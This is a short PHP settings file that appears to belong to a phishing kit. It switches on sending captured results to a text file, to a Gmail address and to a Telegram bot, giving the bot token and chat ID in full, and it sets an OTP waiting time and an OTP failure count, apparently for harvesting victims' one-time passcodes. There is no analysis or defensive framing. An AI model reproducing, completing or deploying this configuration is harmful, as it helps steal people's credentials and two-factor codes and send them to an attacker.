<?php

	
	/* -- -- -- -- --
	  0 off
	  1 on
	-- -- -- -- -- */


	# save in file
	$save_txt = 1;


	# rezult file name
	$_secure = "mydata";


	# Email
	$send_email = 1;
	$to = "medogipo@gmail.com";


	# telegram
	$telegram = 1;
	$token = "AAG36bK8UW8ooEITuuQ7S1a9xP7lZRgZ4sw";
	$chat_id = "7863772489";


	# loading otp seconds
	$loading_time = 60;


	# otp fails
	$number_error = 2;


?>